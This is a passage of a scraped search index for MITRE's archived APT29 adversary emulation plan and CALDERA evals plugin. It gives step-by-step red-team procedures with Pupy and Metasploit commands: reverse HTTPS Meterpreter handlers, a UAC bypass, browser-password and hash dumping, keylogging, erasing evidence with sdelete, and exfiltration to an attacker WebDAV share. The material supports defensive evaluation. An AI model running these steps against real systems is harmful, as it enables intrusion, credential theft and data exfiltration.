spawn a command line shell. 15"]},{"i":"step-2---rapid-collection-and-exfiltration","l":"Step 2 - Rapid Collection and Exfiltration","p":["The attacker runs a one-liner command to search the filesystem for document and media files ( T1083, T1119), collecting ( T1005) and compressing ( T1002/ T1560.001) content into a single file. The file is then exfiltrated over the existing C2 connection ( T1041)."]},{"i":"procedures-1","l":"Procedures"},{"i":"2a---collection-t1119-t1005-t1002--t1560001","l":"2.A - Collection (T1119, T1005, T1002 / T1560.001)","p":["Paste the following PowerShell 1-liner into the Pupy terminal:","[pupy (PowerShell)] >","[pupy (PowerShell)] > exit","[pupy (CMD)] > exit"]},{"i":"2b---exfiltration-over-c2-channel-t1041","l":"2.B - Exfiltration Over C2 Channel (T1041)","p":["[pupy] > download C:\\Users\\username\\AppData\\Roaming\\Draft.Zip ."]},{"i":"cited-intelligence-1","l":"Cited Intelligence","p":["Open Invitation Contributor: Kaspersky","CosmicDuke’s information stealing functionality included stealing user files with file extensions that match a predefined list. 1, 2"]},{"i":"step-3---deploy-stealth-toolkit","l":"Step 3 - Deploy Stealth Toolkit","p":["The attacker now uploads a new payload ( T1105) to the victim. The payload is a legitimately formed image file with a concealed PowerShell script ( T1027/ T1027.003). The attacker then elevates privileges via a user account control (UAC) bypass ( T1122/ T1546.015, T1088/ T1548.002), which executes the newly added payload. A new C2 connection is established over port 443 ( T1043 using the HTTPS protocol ( T1071/ T1071.001, T1032/ T1573). Finally, the attacker removes artifacts of the privilege escalation from the Registry ( T1112)."]},{"i":"procedures-2","l":"Procedures"},{"i":"3a---ingress-tool-transfer-t1105","l":"3.A - Ingress Tool Transfer (T1105)","p":["Start Metasploit handler:","[msf] > handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https","From Pupy, upload monkey.png to target:","[pupy] > upload /tmp/monkey.png C:\\Users\\username\\Downloads\\monkey.png[pupy] > shell[pupy CMD] > powershell"]},{"i":"3b---abuse-elevation-control-mechanism-bypass-user-access-control-t1088--t1548002","l":"3.B - Abuse Elevation Control Mechanism: Bypass User Access Control (T1088 / T1548.002)","p":["[pupy (PowerShell)] >","Paste the following 1-liner when prompted for value:","When prompted for value, press: [Enter]","[pupy (PowerShell)] > exit[pupy (CMD)] > %windir%\\system32\\sdclt.exe[pupy CMD] > powershell","You should receive a high integrity Meterpreter callback."]},{"i":"3c---modify-registry-t1112","l":"3.C - Modify Registry (T1112)","p":["[pupy (PowerShell)] > Remove-Item -Path HKCU:\\Software\\Classes\\Folder* -Recurse -Force[pupy (PowerShell)] > exit[pupy (CMD)] > exit"]},{"i":"cited-intelligence-2","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, Microsoft","CosmicDuke has occasionally embedded other malware components that are written to disk and executed. 1","MiniDuke has transferred additional backdoors onto a system via GIF files. 3","SeaDaddy/SeaDuke may support HTTPS/SSL network communications. 4, 13","APT29 has removed tools and forensic artifacts to hide activity, including the usage of Sdelete ( S0195). APT29 has also bypassed UAC to elevate privileges. 5","HAMMERTOSS has embedded pictures with commands using steganography. 6"]},{"i":"step-4---defense-evasion-and-discovery","l":"Step 4 - Defense Evasion and Discovery","p":["The attacker uploads additional tools ( T1105) through the new, elevated access before spawning an interactive powershell.exe shell ( T1086/ T1059.001). The additional tools are decompressed ( T1140) and positioned on the target for usage. The attacker then enumerates running processes ( T1057) to discover/terminate the initial access from Step 1 before deleting various files ( T1107/ T1070.004) associated with that access. Finally, the attacker launches a PowerShell script that performs a wide variety of reconnaissance commands ( T1016, T1033, T1063/ T1518.001, T1069, T1082, T1083), some of which are done by accessing the Windows API ( T1106)."]},{"i":"procedures-3","l":"Procedures"},{"i":"4a---ingress-tool-transfer-t1105","l":"4.A - Ingress Tool Transfer (T1105)","p":["From Metasploit:","[msf] > sessions[msf] > sessions -i 1","[meterpreter*] >","[meterpreter*] > execute -f powershell.exe -i -H","[meterpreter (PowerShell)*] >","[meterpreter (PowerShell)*] > cd C:\\Program Files\\SysinternalsSuite\\"]},{"i":"4b---indicator-removal-on-host-file-deletion-t1107--t1070004","l":"4.B - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","p":["Terminate Pupy RAT process:","[meterpreter (PowerShell)*] > Get-Process","[meterpreter (PowerShell)*] > Stop-Process -Id rcs.3aka3.doc PID -Force","You may now close Pupy.","From Metasploit:","[meterpreter (PowerShell)*] > Gci $env:userprofile\\Desktop","[meterpreter (PowerShell)*] > .\\sdelete64.exe /accepteula $env:USERPROFILE\\Desktop\\?rcs.3aka.doc","[meterpreter (PowerShell)*] > .\\sdelete64.exe /accepteula $env:APPDATA\\Draft.Zip","[meterpreter (PowerShell)*] > .\\sdelete64.exe /accepteula $env:USERPROFILE\\Downloads\\SysinternalsSuite.zip","Import custom script, readme.ps1:","[meterpreter (PowerShell)*] > Move-Item .\\readme.txt readme.ps1","[meterpreter (PowerShell)*] > . .\\readme.ps1"]},{"i":"4c---discovery-t1016-t1033-t1063--t1518001-t1069-t1082-t1083","l":"4.C - Discovery (T1016, T1033, T1063 / T1518.001, T1069, T1082, T1083)","p":["[meterpreter (PowerShell)*] > Invoke-Discovery"]},{"i":"cited-intelligence-3","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, Microsoft, SentinelOne","CozyDuke has been instructed to download and execute other executables, which in some cases included common hacking tools such as PSExec ( S0029). 1","MiniDuke can download and execute new malware and lateral movement tools. 3","APT29 has removed tools and forensic artifacts to hide activity. 5, 7, 13","CozyDuke can be used to spawn a command line shell. 15"]},{"i":"step-5---persistence","l":"Step 5 - Persistence","p":["The attacker establishes two distinct means of persistent access to the victim by creating a new service ( T1031/ T1543.003) and creating a malicious payload in the Windows Startup folder ( T1060/ T1547.001)."]},{"i":"procedures-4","l":"Procedures"},{"i":"5a---create-or-modify-system-process-windows-service-t1031--t1543003","l":"5.A - Create or Modify System Process: Windows Service (T1031 / T1543.003)","p":["[meterpreter (PowerShell)*] > Invoke-Persistence -PersistStep 1"]},{"i":"5b---boot-or-logon-autostart-execution-registry-run-keys--startup-folder-t1060--t1547001","l":"5.B - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1060 / T1547.001)","p":["[meterpreter (PowerShell)*] > Invoke-Persistence -PersistStep 2"]},{"i":"cited-intelligence-4","l":"Cited Intelligence","p":["Open Invitation Contributor: Kaspersky","CosmicDuke has installed a Windows service to achieve persistence on a system. 2","SeaDuke has the ability to persist using a .lnk file stored in the Startup directory. 4","APT29 has used several persistence mechanisms, including .LNK files. 5"]},{"i":"step-6---credential-access","l":"Step 6 - Credential Access","p":["The attacker accesses credentials stored in a local web browser ( T1081/ T1552.001, T1003/ T1555.003) using a tool renamed to masquerade as a legitimate utility ( T1036/ T1036.005). The attacker then harvests private keys ( T1145/ T1552.004) and password hashes ( T1003/ T1003.002)."]},{"i":"procedures-5","l":"Procedures"},{"i":"6a---credentials-from-password-stores-credentials-from-web-browsers-t1003--t1555003","l":"6.A - Credentials from Password Stores: Credentials from Web Browsers (T1003 / T1555.003)","p":["Execute chrome-password collector:","[meterpreter (PowerShell)*] > C:\\Program Files\\SysinternalsSuite\\accesschk.exe"]},{"i":"6b---unsecured-credentials-private-keys-t1145--t1552004","l":"6.B - Unsecured Credentials: Private Keys (T1145 / T1552.004)","p":["Steal PFX certificate:","[meterpreter (PowerShell)*] > Get-PrivateKeys","[meterpreter (PowerShell)*] > exit"]},{"i":"6c---os-credential-dumping-security-account-manager-t1003--t1003002","l":"6.C - OS Credential Dumping: Security Account Manager (T1003 / T1003.002)","p":["Dump password hashes:","[meterpreter*] > run post/windows/gather/credentials/credential_collector"]},{"i":"cited-intelligence-5","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, SentinelOne","CosmicDuke’s information stealing functionality has included exporting user’s cryptographic certificates, including private keys, and collecting user credentials, including passwords from web browsers (ex: Google Chrome). CozyDuke has contained modules that can steal NTLM hashes as well as capture screenshots. 1, 2"]},{"i":"step-7---collection-and-exfiltration","l":"Step 7 - Collection and Exfiltration","p":["The attacker collects screenshots ( T1113), data from the user’s clipboard ( T1115), and keystrokes ( T1056/ T1056.001). The attacker then collects files ( T1005), which are compressed and encrypted ( T1560/ T1560.001), before being exfiltrated to an attacker-controlled WebDAV share ( T1048/ T1048)."]},{"i":"procedures-6","l":"Procedures"},{"i":"7a---user-monitoring-t1113-t1115-t1056--t1056001","l":"7.A - User Monitoring (T1113, T1115, T1056 / T1056.001)","p":["[meterpreter*] > execute -f powershell.exe -i -H","[meterpreter (PowerShell)*] > cd C:\\Program Files\\SysinternalsSuite","[meterpreter (PowerShell)*] > Move-Item .\\psversion.txt psversion.ps1","[meterpreter (PowerShell)*] > . .\\psversion.ps1","[meterpreter (PowerShell)*] > Invoke-ScreenCapture;Start-Sleep -Seconds 3;View-Job -JobName Screenshot","From the Windows victim, type text and copy to the clipboard.","[meterpreter (PowerShell)*] > Get-Clipboard","[meterpreter (PowerShell)*] > Keystroke-Check","[meterpreter (PowerShell)*] > Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName Keystrokes","From victim system, enter keystrokes.","View keylog output from Metasploit:","[meterpreter (PowerShell)*] > View-Job -JobName Keystrokes[meterpreter (PowerShell)*] > Remove-Job -Name Keystrokes -Force[meterpreter (PowerShell)*] > Remove-Job -Name Screenshot -Force"]},{"i":"7b---compression-and-exfiltration-t1048-t1002-t1022--t1560001","l":"7.B - Compression and Exfiltration (T1048, T1002, T1022 / T1560.001)","p":["[meterpreter (PowerShell)*] > Invoke-Exfil"]},{"i":"cited-intelligence-6","l":"Cited Intelligence","p":["Open Invitation Contributor: Kaspersky","CosmicDuke’s information stealing functionality has included keylogging, taking screenshots, and stealing clipboard contents. Collected data can be exfiltrated using WebDAV. 1, 2","CozyDuke can be used to take screenshots of a full desktop window and encrypt collected data. 15"]},{"i":"step-8---lateral-movement","l":"Step 8 - Lateral Movement","p":["The attacker uses Lightweight Directory Access Protocol (LDAP) queries to enumerate other hosts in the domain ( T1018) before creating a remote PowerShell session to a secondary victim ( T1021/ T1021.006). Through this connection, the attacker enumerates running processes ( T1057). Next, the attacker uploads ( T1105) a new UPX-packed payload ( T1027/ T1027.002) to the secondary victim. This new payload is executed on the secondary victim via the PSExec utility ( T1021/ T1021.002, T1035/ T1569.002) using the previously stolen credentials ( T1078/ T1078.002)."]},{"i":"procedures-7","l":"Procedures"},{"i":"8a---remote-services-windows-remote-management-t1021--t1021006","l":"8.A - Remote Services: Windows Remote Management (T1021 / T1021.006)","p":["Copy payload to webdav share:","[user@attacker]# cp attack-evals/apt29/day1/payloads/python.exe /var/www/webdav/[user@attacker]# cd /var/www/webdav[user@attacker]# chown -R www-data:www-data python.exe","Switch back to Meterpreter shell:","[meterpreter (PowerShell)*] > Ad-Search Computer Name *","[meterpreter (PowerShell)*] >","Note the session ID for step 8C."]},{"i":"8b---ingress-tool-transfer-t1105","l":"8.B - Ingress Tool Transfer (T1105)","p":["Start a new instance of Metasploit, and spawn a Metasploit handler:","[bash] > msfconsole","[msf] > handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https","Return to current Meterpreter session:","[meterpreter (PowerShell)*] > Invoke-SeaDukeStage -ComputerName victim 2 IP"]},{"i":"8c---system-services-service-execution-t1035--t1569002","l":"8.C - System Services: Service Execution (T1035 / T1569.002)","p":["Execute SEADUKE Remotely via PSEXEC","[meterpreter (PowerShell)*] >","You should receive a callback in your other Metasploit terminal."]},{"i":"cited-intelligence-7","l":"Cited Intelligence","p":["Open Invitation Contributors: Microsoft, SentinelOne","SeaDuke has been written in Python and has been delivered through the CozyDuke toolkit. 1, 13","SeaDuke/SeaDaddy samples have been UPX-packed. 4, 5, 12","APT29 has UPX-packed and used SMB to transfer files. 5","APT29 has used UPX-packed, Python-compiled backdoors. 7"]},{"i":"step-9---collection","l":"Step 9 - Collection","p":["The attacker uploads additional utilities to the secondary victim ( T1105) before running a PowerShell one-liner command ( T1059/ T1059.001) to search for filesystem for document and media files ( T1083, T1119). Files of interested are collected ( T1005) then encrypted and compressed ( T1002, T1022/ T1560.001 into a single file ( T1074/ T1074.001). The file this then exfiltrated over the existing C2 connection ( T1041). Finally, the attacker deletes various files ( T1107/ T1070.004) associated with that access."]},{"i":"procedures-8","l":"Procedures"},{"i":"9a---ingress-tool-transfer-t1105","l":"9.A - Ingress Tool Transfer (T1105)","p":["From the second Metasploit terminal:","[msf] > sessions[msf] > sessions -i 1","[meterpreter*] >"]},{"i":"9b---collection-and-exfiltration-t1005-t1041-t1002--t1022--t1560001","l":"9.B - Collection and Exfiltration (T1005, T1041, T1002, T1022 / T1560.001)","p":["[meterpreter*] > execute -f powershell.exe -i -H","[meterpreter (PowerShell)*] >","[meterpreter (PowerShell)*] > cd C:\\Windows\\Temp","[meterpreter (PowerShell)*] > .\\Rar.exe a -hpfGzq5yKw $env:USERPROFILE\\Desktop\\working.zip $env:APPDATA\\working.zip","[meterpreter (PowerShell)*] > exit","[meterpreter*] > download C:\\\\Users\\\\username\\\\Desktop\\\\working.zip ."]},{"i":"9c---indicator-removal-on-host-file-deletion-t1107--t1070004","l":"9.C - Indicator Removal on Host: File Deletion (T1107 / T1070.004)","p":["[meterpreter*] > shell","[meterpreter (Shell)*] > cd C:\\Windows\\Temp","[meterpreter (Shell)*] > .\\sdelete64.exe /accepteula C:\\Windows\\Temp\\Rar.exe","[meterpreter (Shell)*] > .\\sdelete64.exe /accepteula C:\\Users\\username\\AppData\\Roaming\\working.zip","[meterpreter (Shell)*] > .\\sdelete64.exe /accepteula C:\\Users\\username\\Desktop\\working.zip","[meterpreter (Shell)*] > del C:\\Windows\\Temp\\sdelete64.exe","Terminate Session","[meterpreter (Shell)*] > exit[meterpreter*] > exit msf> exit"]},{"i":"cited-intelligence-8","l":"Cited Intelligence","p":["Open Invitation Contributors: Kaspersky, Microsoft, SentinelOne","CosmicDuke’s information stealing functionality has included stealing user files with file extensions that match a predefined list and exfiltrating collected data via HTTPS. SeaDuke can execute command such as uploading and downloading files. 1, 2","MiniDuke can download and execute new malware and lateral movement tools. 3","SeaDuke has contained commands to download and Base-64-encode files. 4","APT29 has removed tools and forensic artifacts to hide activity, including the usage of Sdelete ( S0195). 5, 7, 13","SeaDaddy has used RAR to archive collected data. 7","CozyDuke can be used to take screenshots of a full desktop window and encrypt collected data. 15"]},{"i":"step-10---persistence-execution","l":"Step 10 - Persistence Execution","p":["The original victim is rebooted and the legitimate user logs in, emulating ordinary usage and a passage of time. This activity triggers the previously established persistence mechanisms, namely the execution of the new service ( T1035/ T1569.002) and payload in the Windows Startup folder ( T1060/ T1547.001). The payload in the Startup folder executes a follow-on payload using a stolen token ( T1106, T1134/ T1134.002)."]},{"i":"procedures-9","l":"Procedures"},{"i":"10a---system-services-service-execution-t1035--t1569002","l":"10.A - System Services: Service Execution (T1035 / T1569.002)","p":["Reboot Windows victim 1; wait for system to boot up","You should receive a callback with SYSTEM permissions from the javamtsup service"]},{"i":"10b---boot-or-logon-autostart-execution-registry-run-keys--startup-folder-t1060--t1547001","l":"10.B - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1060 / T1547.001)","p":["Trigger the Startup Folder persistence by logging in to Windows victim 1"]},{"i":"cited-intelligence-9","l":"Cited Intelligence","p":["Open Invitation Contributor: Kaspersky","CosmicDuke has installed persistence services that duplicate and uses the process token of explorer.exe to start the malware. 2"]},{"l":"Acknowledgments"},{"i":"special-thanks-to-the-following-public-resources","l":"Special thanks to the following public resources:","p":["Metasploit ( https://github.com/rapid7/metasploit-framework)","Pupy ( https://github.com/n1nj4sec/pupy)","Invoke-PSImage ( https://github.com/peewpw/Invoke-PSImage)","Microsoft Sysinternals ( https://docs.microsoft.com/en-us/sysinternals/)"]},{"l":"Additional Plan Resources","p":["Intelligence Summary","Operations Flow","Emulation Plan","Scenario 1 - Infrastructure","Scenario 1","Scenario 2 - Infrastructure","Scenario 2","YAML","Archive","Issues","Change Log"]}],[{"l":"Scenario 1 Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by APT29. The infrastructure listed below is specific to Scenario 1. The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating APT29 to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server.","Please note that binary files hosted in Scenario_1 and Scenario_2 have been added to password protected zip files. The password for these files is \"malware.\""]},{"l":"Emulation Team Infrastructure","p":["Attack Platform: tested and executed on Ubuntu 18.04.3 LTS","C2 Framework","Pupy","Metasploit Framework","Chrome Password Dumper","Sysinternals Suite Zip file","WebDAV Share","Redirector: tested and executed on Ubuntu 18.04.3 LTS","Socat","Windows Attack Platform: Windows 10 x64 version 1903","Invoke-PSImage","Python 3","PyInstaller","Note: The Windows attack platform is only required if you would like to compile the Scenario 1 payloads. If you use the pre-compiled payloads, you do not need this system."]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Attack Platform","192.168.0.4","Redirector","192.168.0.5"]},{"l":"A note about red team payloads","p":["This evaluation utilizes four payloads that model APT29 malware.","The payloads are customized variants of reverse shells from Pupy RAT and Metasploit.","Pre-compiled payloads are available in the resources directory; however, they are configured to connect back to static IP addresses 192.168.0.5 and 192.168.0.4.","If you would like to build the payloads yourself, please see payload_configs.md for further instructions."]},{"i":"setup-redirector-19216805-or-the-value-used-for-the-redirector-ip","l":"Setup Redirector: 192.168.0.5 (or the value used for the Redirector IP)","p":["From the redirector system, setup port forwarding using Socat."]},{"i":"setup-attack-platform-19216804","l":"Setup Attack Platform: 192.168.0.4","p":["Download Chrome password dumper tool from: https://github.com/adnan-alhomssi/chrome-passwords/raw/master/bin/chrome-passwords.exe","Download SysInternals zip folder from: https://download.sysinternals.com/files/SysinternalsSuite.zip","Unzip SysinternalsSuite.zip; copy the following files into the SysInternalsSuite directory:","readme.txt","psversion.txt","chrome-passwords.exe(renamed as accessChk.exe)","strings64.exe(compiled from hostui.cpp)","Zip modified SysinternalsSuite folder","Install Pupy and Metasploit on Attack Platform by running install_day1_tools.sh","Start Pupy docker container then the EC4 listener","sudo pupy/start-compose.sh","listen -a ec4"]},{"l":"Target Infrastructure","p":["3 targets","1 domain controller and 2 workstations","All Windows OS (tested and executed against Win10 1903)","Domain joined","Same local administrator account on both Windows workstations","Google Chrome Web Browser must be available on one of the victim workstations"]},{"l":"Target Infrastructure Configuration"},{"i":"for-each-of-the-2-target-workstations","l":"For each of the 2 target workstations:","p":["Login in as user with administrator privileges","Ensure Windows Defender is off or configured to alert-only","Set UAC to never notify ( https://articulate.com/support/article/how-to-turn-user-account-control-on-or-off-in-windows-10)","Verify user has read/write/execute permissions in the C:\\Windows\\Temp directory","Install Google Chrome ( https://www.google.com/chrome/); cache credentials in Chrome password manager","Import-PFX certificate found in shockwave.local.pfx. Instructions below:"]},{"l":"Import PFX Certificate","p":["Step 6.B of this emulation models theft of Private Keys.","Copy the PFX certificate located in the shockwave.local.pfx file to the Windows victims.","Import the certificate using PowerShell:"]},{"i":"add-rtlo-character-and-place-rcs3aka3doc-on-windows-victim-1","l":"Add RTLO character and place rcs.3aka3.doc on Windows Victim-1","p":["See payload_configs.md for instructions on how to update cod.3aka3.scr"]},{"l":"Additional Plan Resources","p":["Intelligence Summary","Operations Flow","Emulation Plan","Scenario 1 - Infrastructure","Scenario 1","Scenario 2 - Infrastructure","Scenario 2","YAML","Archive","Issues","Change Log"]}],[{"l":"Machine-Readable APT29 Emulation Plans","p":["The universal, technology-agnostic version of the APT29 emulation plan YAML has been provided as starting point for machine parsing and execution of the APT29 emulation plan. This folder will store all versions of this yaml file, including those formatted to work with specific execution runners (such as automated agents like CALDERA or other breach simulation frameworks)."]},{"l":"Included Formats","p":["As new files are added, please list them in the below table.","File","Execution Framework","Notes","APT29.yaml","N/A","Initial Emulation Plan YAML"]},{"l":"Additional Plan Resources","p":["Intelligence Summary","Operations Flow","Emulation Plan","Scenario 1 - Infrastructure","Scenario 1","Scenario 2 - Infrastructure","Scenario 2","YAML","Archive","Issues","Change Log"]}],[{"i":"apt29-emulation-archived","l":"APT29 Emulation (ARCHIVED)","p":["This content was developed as part of the APT29 ATT&CK Evaluations and includes both the resources used to manually execute the emulation as well as a plug-in developed for CALDERA(2.6.6).","For more details about the APT29 ATT&CK Evaluations, including results, visit https://attackevals.mitre-engenuity.org/APT29/"]},{"l":"Adversary Overview","p":["APT29/The Dukes/Cozy Bear/YTTRIUM(hereinafter referred to as just APT29) is a threat group that has been attributed to the Russian government and has operated since at least 2008. 1 14 This group has been attributed to major breaches targeting U.S. governments/organizations such as the Democratic National Committee, as well as various international ministries and agencies. 15 16 APT29 has also been known to “cast a wide net” in terms of targeting, seemingly making this group a universal threat.","In terms of operational tradecraft, APT29 is distinguished by their commitment to stealth and sophisticated implementations of techniques via an arsenal of custom malware. APT29 typically accomplishes goals via custom compiled binaries and alternate (at least at the time) execution methods such as PowerShell and WMI. APT29 has also been known to employ various operational cadences (smash-and-grab vs. slow-and-deliberate) depending on the perceived intelligence value and/or infection method of victims."]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Copyright 2020 The MITRE Corporation","Approved for Public Release; Distribution Unlimited. Case Number 19-03607-2.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CK®","ATT&CK Terms of Use"]}],[{"i":"caldera-plugin-evals--archived","l":"CALDERA plugin: evals (ARCHIVED)"},{"l":"Overview","p":["This repository contains the evals plugin for CALDERA. This plugin contains the TTPs used within the ATT&CK Evaluations round 2 (APT29) and round 1 (APT3). For more information, please see the evaulations website.","Please read this README.md in its entirety to avoid missing crucial steps when executing an adversary."]},{"l":"Initial CALDERA Installation","p":["Clone CALDERA 2.6.6","Clone the Eval plugin into the caldera/plugins directory","Add the eval plugin to CALDERA config conf/local.yml"]},{"l":"Round 2 Adversary","p":["The APT29 adversary is broken up into three separate CALDERA adversaries that execute commands in different phases. Under the operation panel you will see these phases listed as APT29 - Day 1.A, APT29 - Day 1.B, and APT29 - Day 2. Leverage the appropriate CALDERA SANDCAT groups for each operational phase. Prior to running an operation, please consult the environment setup steps below."]},{"i":"environment-setup---evals-round-2---apt29","l":"Environment Setup - Evals Round 2 - APT29","p":["Consult the ATT&CK EVALUATION's Environment web page for a reference guide on how to replicate the range environment. Ensure that all A/V is disabled within the environment to successfully replicate the EVALS environment.","On your day 2 initial host you will need to manually browse to C:\\Windows\\Temp via Windows Explorer and accept the prompt.","Requirements for the round 2 adversary are the following:","Initial host exists within a Windows domain.","Install Google Chrome on the target.","OneDrive account for data exfil.","Failing to setup a OneDrive account will result only in an exfiltration ability failing, but the entire plugin can still run.","Disabling A/V products on host.","Failing to disable A/V products on the host will likely resolve in payloads being removed before abilities are executed.","It is recommended that you first execute the evals plugin in an isolated-test environment to fully understand the TTPs performed on hosts, as well as the artifacts left behind."]},{"l":"Setting Up CALDERA Facts","p":["Next, update the CALDERA facts now located in /caldera/plugins/evals/data/sources/4fb34bde-b06d-445a-a146-8e35f79ce546.yml with the appropriate values for your environment. Keys to update include:","Update target.domain.name to your environment's domain name.","Update target.winrm.username to an administrator account you will later laterally move to.","Update target.winrm.password to the administrators password used by target.winrm.username( THIS WILL BE STORED IN PLAINTEXT).","Update target.winrm.remote_host to the remote host with winrm enabled for lateral movement.","Update pivot_machine_hostname to the hostname of a Windows host for lateral movement via psexec.","Update profile_user as the initial user the first SANDCAT agent will be spawning under.","Update profile_user_password to the profiler_user's password ( THIS WILL BE STORED IN PLAINTEXT).","Update profile_user_day2 to another user within the domain.","Update profile_user_password_day2 to profile_user_day2's password ( THIS WILL BE STORED IN PLAINTEXT).","Update onedrive.url to a OneDrive url.","Update onedrive.username to a OneDrive account that will be used for data exifiltration.","Update onedrive.password to the onedrive.username's password ( THIS WILL BE STORED IN PLAINTEXT)."]},{"l":"Setting Up the CALDERA Server","p":["After initially cloning the CALDERA server, modify the conf/default.yml and set the CALDERA server's IP and port.","vim ./conf/default.yml","Note, this is a relative path from the plugin's location."]},{"l":"Setting Up Payloads","p":["Prior to executing any of the commands listed below, certain payloads must be configured with your CALDERA server's IP address and port. To accomplish this, use the setup.py. Python script located in the payloads directory of the evals’ plugin to dynamically update the payloads to the appropriate IP and port.","cd plugins/evals/ python3 ./payloads/setup.py"]},{"l":"Starting CALDERA","p":["Activate the Python virtual environment created by install.sh.","cd ../../ source ./calderaenv/bin/activate","Start a fresh instance of CALDERA.","python3 server.py --fresh"]},{"i":"evals-round-2---apt-29--operation-steps","l":"EVALs Round 2 - APT 29 Operation Steps","p":["The APT29 adversary profile is broken down into three separate adversary profiles. These profiles include APT29 Day-1 A, APT29 Day-1 B - Lateral Movement, and APT29 Day-2. To successfully replicate the ATT&CK evals process, an environment setup like the one outlined in the environment setup section is assumed."]},{"i":"apt29-day-1a","l":"APT29 Day 1.A","p":["Perform the following steps to get started with the APT29 adversary profiles:","Start a SANDACAT agent with elevated privileges. To do so, copy the SANDCAT cradle from the agent’s tab and execute in an elevated user’s PowerShell prompt.","img-0","img-1","img-2","img-3","Before hitting \"enter\" within the PowerShell prompt, you should change the default group from \"red\" to something more descriptive such as \"red-day-1-A\". See the image below.","img-4","At this point, you should then see an agent call back to your CALDERA server, which is visible under the \" agents\" tab. img-5","img-6","Now that we have an agent, we can run an operation. Select \" APT29 Day-1 A\" from the operation page. img-7","img-8","Start the APT29 Day-1 operation."]},{"i":"apt29-day-1b---lateral-movement","l":"APT29 Day 1.B - Lateral Movement","p":["Additional agents will spawn from the APT29 Day-1 A operation including a SANDCAT agent renamed as \"python.exe\". This will be the starting for APT29 Day-1 B. To start APT29 Day-1 B, start another operation with the group the \"python.exe\" agent is in. Agent metadata can be viewed by clicking on the process id within the CALDERA interface.","img-10","img-11","Now that we have verified the new agent exists, run a new operation using the APT29 1.B - Lateral Movement adversary profile."]},{"l":"APT29 Day 2","p":["The APT29 Day-2 adversary profile expects a new agent to be run on a new machine as a non-elevated user. Copy the SANDCAT cradle as previously done and execute in a non-administrator PowerShell prompt.","img-12","After completing all adversary steps outlined above, RDPing into the target host should trigger additional persistence mechanisms."]},{"i":"issues","l":"Issues?","p":["Please consult the common problems page on the CALDERA Read the Docs page. If you're still having issues, please open a git issue on the evals plugin page and follow the guidelines within ISSUES.md for reporting issues."]},{"l":"Acknowledgements","p":["Microsoft Sysinternals","Mimikatz","PoshC2","PowerShell Empire","PowerShell Mafia"]}],[{"l":"ISSUES"},{"l":"How to Report an Issue","p":["Before reporting an issue with GitHub, be sure that:","you are using version 2.6.6 of CALDERA.","the issue was not already reported.","you follow the example template below."]}],[{"l":"Payloads"},{"l":"Payloads Explained","p":["* vpn","*.doc","*.docx","*.jpg","*.jtd","*.lnk","*.lwp","*.ods","*.odt","*.ost","*.pdf","*.pps","*.ppsx","*.ppt","*.pptx","*.pst","*.rar","*.txt","*.url","*.wpd","*.wps","*.xls","*.xlsx","*.xps","*.zip","2016_United_States_presidential_election_-_Wikipedia.html: Staging payload for ADFS.","admin","cod.3aka.scr.exe: Sandcat payload to complete RTLO execution.","dmevals.local.pfx: Staged private key used for Get-PrivateKey discovery.","File-Collection.ps1: PowerShell script to collect the following:","Get-Screenshot.ps1: PowerShell Empire Script script to take screenshots.","Invoke-BypassUACTokenManipulation.ps1: PowerShell Empire script to bypass UAC.","Invoke-Mimikatz.ps1: PowerShell Empire PowerShell script to execute Mimikatz.","Invoke-PSInject.ps1: PowerShell Empire PowerShell script to execute base64 encoded PowerShell code.","invoke-winrmsession.ps1: PoshC2 script to create winrm sessions.","login","m.exe: Mimikatz executable.","make_lnk.ps1: Payload generation script to create masqumasquerading .lnk file","MITRE-ATTACK-EVALS.HTML: Staged .html only used for Discovery.","Modified-SysInternalsSuite.zip: Utilities used in persistence mechanisms that are stored within a SysInternals directory.","monkey.png: Stenography png with encoded payload.","Note, none of the utilities here are actually Windows SysInternals tools. The SysInternals is downloaded from Microsoft during Day-1 A execution.","pass","powerview.ps1: Powerview functions to execute reflective loading.","ps.ps1: Process enumeration.","psw","rar.exe: Archive utility.","sandcat.go-windows-upx: UPX packed Sandcat binary.","sandcat.go-windows: Sandcat binary.","schemas.ps1: Payload generation script using alternate data streams.","setup.py: Setup utility to update all payloads with appropriate IP:PORT.","sifer","sifr","StealToken.ps1: Steal a process' token.","stepFifteen_wmi.ps1: WMI persistence.","stepFourteen_bypassUAC.ps1: UAC bypass via sdclt.exe.","stepFourteen_credDump.ps1: WMI Based credential dump.","stepSeventeen_email.ps1: Outlook e-mail enumeration.","stepSeventeen_zip.ps1: Zip up a directory.","stepSixteen_SID.ps1: Get SID of user.","stepThirteen.ps1: Discovery functions.","stepTwelve.ps1: Detect AntiVirus.","timestomp.ps1: Timestomp a file.","update.ps1: Update sandcat payload.","upload.ps1: CALDERA upload utility.","wipe.ps1: Reflectivly load sdelete64.exe."]}],[{"i":"emulation-plan-archived","l":"Emulation Plan (ARCHIVED)","p":["Please see the formal APT29 emulation document, which includes a break-down of the cited intelligence used for each step of this emulation.","The Evaluations emulation is split into two distinct scenarios (Days 1 and 2) to reflect these differing operational flows and toolkits used by APT29.","APT Operation Flow"]},{"l":"Day 1","p":["Based on CosmicDuke ATT&CK S0050, MiniDuke ATT&CK S0051, SeaDuke/SeaDaddy ATT&CK 